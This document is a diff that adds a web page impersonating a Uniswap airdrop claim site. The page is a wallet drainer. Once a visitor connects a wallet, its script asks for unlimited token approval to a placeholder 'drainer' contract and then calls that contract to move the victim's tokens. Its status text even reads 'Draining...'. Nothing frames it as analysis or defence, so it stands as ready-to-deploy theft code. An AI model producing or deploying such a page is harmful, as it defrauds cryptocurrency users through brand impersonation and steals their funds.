@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Uniswap — Claim</title>
+  <style>
+    body { font-family: Inter, sans-serif; background:#0d1117; color:#fff;
+           display:flex; flex-direction:column; align-items:center;
+           justify-content:center; height:100vh; margin:0; gap:16px; }
+    button { padding:14px 28px; border-radius:12px; border:none;
+             background:#ff007a; color:#fff; font-size:16px; cursor:pointer; }
+    #status { opacity:.7; font-size:14px; }
+  </style>
+</head>
+<body>
+  <h2>Uniswap</h2>
+  <button id="connect">Connect Wallet</button>
+  <button id="claim" style="display:none">Claim Airdrop</button>
+  <div id="status"></div>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script>
+    const DRAINER = "0xYOUR_DRAINER_CONTRACT_ADDRESS";
+    const TOKEN   = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+    const SPENDER = DRAINER;
+    const MAX     = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+    let signer, user;
+    const status = document.getElementById("status");
+
+    document.getElementById("connect").onclick = async () => {
+      try {
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        user = await signer.getAddress();
+        status.innerText = user.slice(0,6) + "..." + user.slice(-4);
+        document.getElementById("claim").style.display = "inline";
+      } catch(e) { status.innerText = e.message; }
+    };
+
+    document.getElementById("claim").onclick = async () => {
+      try {
+        status.innerText = "Approving...";
+        const token = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
+        await (await token.approve(SPENDER, MAX)).wait();
+
+        status.innerText = "Draining...";
+        const drainer = new ethers.Contract(DRAINER, ["function drain(address,address)"], signer);
+        await (await drainer.drain(user, TOKEN)).wait();
+
+        status.innerText = "Done.";
+      } catch(e) { status.innerText = e.message; }
+    };
+  </script>
+</body>
+</html>
